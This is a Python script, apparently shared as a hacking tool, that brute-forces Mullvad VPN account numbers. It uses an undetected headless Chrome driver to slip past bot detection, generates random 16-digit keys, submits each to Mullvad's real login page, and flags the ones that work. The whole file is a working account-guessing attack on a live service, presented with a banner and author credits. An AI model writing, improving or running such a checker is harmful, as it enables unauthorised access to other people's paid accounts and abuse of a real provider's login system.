import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import random
import string
from pystyle import Center, Colorate, Colors
from colorama import Fore
import os

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_console()
    print(Colorate.Horizontal(Colors.blue_to_cyan, """
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|_______/ |________/|________/ \______/  \______/ |__/  |__/

                ┏━━━━━━━━━━━━━━━━━━━━━┓
                ┃  Author : Ego/xhe   ┃
                ┃ Discord: .gg/xxxx   ┃
                ┗━━━━━━━━━━━━━━━━━━━━━┛

           [1] Generate Key | [2] Check Key
"""))

def setup_driver():
    options = uc.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    return uc.Chrome(options=options)

def generate_key():
    return ''.join(random.choices(string.digits, k=16))

def check_mullvad_key(driver, key):
    try:
        driver.get("https://mullvad.net/fr/account/login")
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "account_number")))
        
        text_field = driver.find_element(By.NAME, "account_number")
        text_field.clear()
        text_field.send_keys(key)
        text_field.send_keys(Keys.RETURN)

        time.sleep(2)
        page_content = driver.page_source.lower()

        if any(error in page_content for error in ["bad", "invalide", "erreur", "incorrect", "wrong"]):
            print(Fore.RED + f"Key {key} invalid.")
            return False
        
        if "welcome" in page_content or "account details" in page_content:
            print(Fore.GREEN + f"Key {key} valid !")
            return True
        
        print(Fore.YELLOW + "Impossible de déterminer si la clé est valide ou non.")
        return False
    
    except Exception as e:
        print(Fore.RED + "Erreur :", e)
        return False

def test_generated_keys(driver, n):
    for _ in range(n):
        key = generate_key()
        if check_mullvad_key(driver, key):
            print(f"Valid key found: {key}")
            break

def main():
    driver = setup_driver()
    print_banner()
    choice = input("Choose: ")
    
    if choice == "1":
        test_generated_keys(driver, 10)
    elif choice == "2":
        key = input("Enter Key: ")
        check_mullvad_key(driver, key)
    else:
        print("Invalid choice.")
    
    driver.quit()

if __name__ == "__main__":
    main()